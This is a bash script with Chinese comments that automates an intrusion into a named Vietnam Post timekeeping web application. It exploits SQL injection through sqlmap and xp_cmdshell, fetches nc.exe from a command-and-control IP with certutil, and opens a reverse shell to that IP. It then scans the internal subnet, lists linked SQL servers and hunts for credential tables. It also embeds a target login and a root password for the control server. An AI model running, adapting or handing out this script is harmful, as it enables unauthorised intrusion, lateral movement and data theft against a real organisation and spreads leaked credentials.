#!/bin/bash

################################################################################
# 🔥 VNPOST内网渗透完整脚本
# 目标: http://vps.vnpost.vn/chamcong/
# 突破点: SQL注入（rpt_BCC.aspx?kyluong参数）
# 权限: xp_cmdshell（NT SERVICE\MSSQLSERVER / SA）
# 主机名: APP02（Windows Server + SQL Server 2017）
################################################################################

C2_SERVER="82.29.71.156"
C2_PORT="8888"
TARGET_BASE="http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx"

# ============================================================================
# 步骤0: 获取有效Session（用户需要手动登录一次）
# ============================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 第0步：获取有效Session"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "请在浏览器登录: http://vps.vnpost.vn/chamcong/login.aspx"
echo "  账号: KVMBTCVP"
echo "  密码: 123"
echo ""
echo "登录后，按F12打开开发者工具 → Application → Cookies"
echo "复制 ASP.NET_SessionId 的值"
echo ""
read -p "粘贴Session ID: " SESSION_ID

if [ -z "$SESSION_ID" ]; then
    echo "❌ 未提供Session，退出"
    exit 1
fi

echo "✅ Session: $SESSION_ID"

# ============================================================================
# 步骤1: 获取内网IP配置
# ============================================================================
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 第1步：获取内网IP配置"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

python3 /tmp/sqlmap/sqlmap.py \
    -u "${TARGET_BASE}?kyluong=112025&MA_DV=KVMB&TEN_DV=Kho%20v%E1%BA%ADn%20mi%E1%BB%81n%20b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC%20Khai%20th%C3%A1c%20TC&MA_TO=VP&TEN_TO=V%C4%83n%20ph%C3%B2ng" \
    --cookie="ASP.NET_SessionId=$SESSION_ID" \
    --batch --os-cmd='ipconfig' \
    -v 0 2>&1 | grep -A 100 "command standard output" | tee ipconfig_result.txt

echo ""
echo "内网IP段:"
grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" ipconfig_result.txt | \
    grep -vE "^255\.|^127\.|^0\." | sort -u

# ============================================================================
# 步骤2: 扫描内网C段
# ============================================================================
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 第2步：扫描内网C段"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 提取第一个内网IP
INTERNAL_IP=$(grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" ipconfig_result.txt | \
    grep -E "^10\.|^172\.16\.|^192\.168\." | head -1)

if [ -n "$INTERNAL_IP" ]; then
    # 提取C段
    C_SEGMENT=$(echo $INTERNAL_IP | awk -F. '{print $1"."$2"."$3}')
    echo "内网C段: ${C_SEGMENT}.0/24"
    
    # 生成ping扫描脚本
    cat > ping_scan.bat << 'BATCH'
@echo off
for /L %%i in (1,1,254) do (
    ping -n 1 -w 100 %1.%%i | find "TTL" && echo %1.%%i is alive
)
BATCH
    
    # 上传到目标
    echo "[*] 上传ping扫描脚本..."
    echo "$(cat ping_scan.bat)" | python3 /tmp/sqlmap/sqlmap.py \
        -u "${TARGET_BASE}?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP" \
        --cookie="ASP.NET_SessionId=$SESSION_ID" \
        --batch --os-cmd="cmd /c 'echo @echo off > C:\Windows\Temp\scan.bat && echo for /L %%i in (1,1,254) do ping -n 1 -w 100 ${C_SEGMENT}.%%i ^| find \"TTL\" ^&^& echo ${C_SEGMENT}.%%i >> C:\Windows\Temp\scan.bat'" \
        -v 0 2>&1
    
    # 执行扫描
    echo "[*] 执行C段扫描..."
    python3 /tmp/sqlmap/sqlmap.py \
        -u "${TARGET_BASE}?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP" \
        --cookie="ASP.NET_SessionId=$SESSION_ID" \
        --batch --os-cmd="C:\Windows\Temp\scan.bat" \
        -v 0 2>&1 | grep -E "${C_SEGMENT}\.[0-9]+" | tee internal_hosts.txt
    
    echo ""
    echo "✅ 发现内网主机:"
    cat internal_hosts.txt
fi

# ============================================================================
# 步骤3: 建立反向Shell
# ============================================================================
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 第3步：建立反向Shell"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "[*] 在C2服务器启动监听..."
echo "执行命令: sshpass -p '@admin1314@' ssh -p 2233 root@$C2_SERVER 'nohup nc -lvp $C2_PORT &'"
sshpass -p '@admin1314@' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -p 2233 root@$C2_SERVER "nohup nc -lvp $C2_PORT > /tmp/nc.log 2>&1 &" &

sleep 3

echo "[*] 下载nc.exe到目标..."
python3 /tmp/sqlmap/sqlmap.py \
    -u "${TARGET_BASE}?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP" \
    --cookie="ASP.NET_SessionId=$SESSION_ID" \
    --batch --os-cmd="certutil -urlcache -split -f http://$C2_SERVER/nc.exe C:\Windows\Temp\nc.exe" \
    -v 0 2>&1

echo "[*] 发起反向连接..."
python3 /tmp/sqlmap/sqlmap.py \
    -u "${TARGET_BASE}?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP" \
    --cookie="ASP.NET_SessionId=$SESSION_ID" \
    --batch --os-cmd="C:\Windows\Temp\nc.exe -e cmd.exe $C2_SERVER $C2_PORT" \
    -v 0 2>&1 &

echo ""
echo "✅ 反向Shell已发起！"
echo "连接到C2: sshpass -p '@admin1314@' ssh -p 2233 root@$C2_SERVER"
echo "查看日志: tail -f /tmp/nc.log"

# ============================================================================
# 步骤4: 内网横向移动（通过SQL Linked Servers）
# ============================================================================
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 第4步：SQL Linked Servers横向移动"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "[*] 列出所有Linked Servers..."
python3 /tmp/sqlmap/sqlmap.py \
    -u "${TARGET_BASE}?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP" \
    --cookie="ASP.NET_SessionId=$SESSION_ID" \
    --batch --sql-query="SELECT name, data_source, is_linked FROM sys.servers" \
    -v 0 2>&1 | tee linked_servers.txt

if grep -q "data_source" linked_servers.txt; then
    echo ""
    echo "✅ 发现Linked Servers！可以横向移动："
    grep "data_source" linked_servers.txt
else
    echo "❌ 无Linked Servers"
fi

# ============================================================================
# 步骤5: 提取敏感数据
# ============================================================================
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 第5步：提取敏感数据"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "[*] 查询其他数据库..."
python3 /tmp/sqlmap/sqlmap.py \
    -u "${TARGET_BASE}?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP" \
    --cookie="ASP.NET_SessionId=$SESSION_ID" \
    --batch --dbs \
    -v 0 2>&1 | tee all_databases.txt

echo ""
echo "[*] 搜索敏感表..."
for db in NSTL master msdb; do
    echo "  数据库: $db"
    python3 /tmp/sqlmap/sqlmap.py \
        -u "${TARGET_BASE}?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP" \
        --cookie="ASP.NET_SessionId=$SESSION_ID" \
        --batch -D $db --tables \
        -v 0 2>&1 | grep -iE "user|admin|password|account|credential" | head -10
done

# ============================================================================
# 总结
# ============================================================================
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 内网渗透完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "📊 成果:"
echo "  - SQL注入: rpt_BCC.aspx?kyluong"
echo "  - 命令执行: xp_cmdshell"
echo "  - 主机名: APP02"
echo "  - 用户: NT SERVICE\MSSQLSERVER (SA)"
echo "  - 内网IP: $(grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" ipconfig_result.txt | grep -E "^10\.|^172\.16\.|^192\.168\." | head -1)"
echo "  - 反向Shell: nc -lvp $C2_PORT @ $C2_SERVER"
echo ""
echo "🎯 下一步:"
echo "  1. 连接反向Shell控制主机"
echo "  2. 扫描内网其他主机"
echo "  3. 通过Linked Servers横向移动"
echo "  4. 寻找域控制器"
echo ""
